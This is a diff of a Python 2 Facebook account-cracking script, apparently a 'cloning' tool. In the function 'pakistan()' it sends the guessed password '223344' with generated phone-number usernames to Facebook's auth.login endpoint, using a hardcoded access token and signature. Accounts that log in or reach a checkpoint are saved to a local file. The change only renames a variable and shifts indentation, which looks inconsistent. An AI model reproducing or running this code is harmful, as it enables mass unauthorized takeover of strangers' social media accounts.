@@ -208,22 +208,22 @@ def pakistan():
 									cps.close()
 									checkpoint.append(user+pass3)
 								else:
-							        pass3 = '223344'
-							        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+k+c+user+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-							        w = json.load(data)
-							        if 'access_token' in w:
-								        print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + k + c + user + ' \x1b[1;97m|\x1b[1;30m ' + pass4
-								        oka = open('save/pakistan.txt', 'a')
-								        oka.write("[Checkpoint] " +k+c+user+" | "+pass4+"\n")
-								        oka.close()
-								        oks.append(user+pass4)
-							        else:
-								        if 'www.facebook.com' in w['error_msg']:
-									    print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + k + c + user + ' \x1b[1;97m|\x1b[1;97m ' + pass4
-									    cps = open('save/pakistan.txt', 'a')
-									    cps.write("[Checkpoint] " +k+c+user+" | "+pass4+"\n")
-									    cps.close()
-									    checkpoint.append(user+pass4)											
+							                pass4 = '223344'
+							                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+k+c+user+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+							                w = json.load(data)
+							                if 'access_token' in w:
+								               print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + k + c + user + ' \x1b[1;97m|\x1b[1;30m ' + pass4
+								               oka = open('save/pakistan.txt', 'a')
+								               oka.write("[Checkpoint] " +k+c+user+" | "+pass4+"\n")
+								               oka.close()
+								               oks.append(user+pass4)
+							                else:
+								               if 'www.facebook.com' in w['error_msg']:
+									       print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + k + c + user + ' \x1b[1;97m|\x1b[1;97m ' + pass4
+									       cps = open('save/pakistan.txt', 'a')
+									       cps.write("[Checkpoint] " +k+c+user+" | "+pass4+"\n")
+									       cps.close()
+									       checkpoint.append(user+pass4)											
 		except:
 			pass
 			
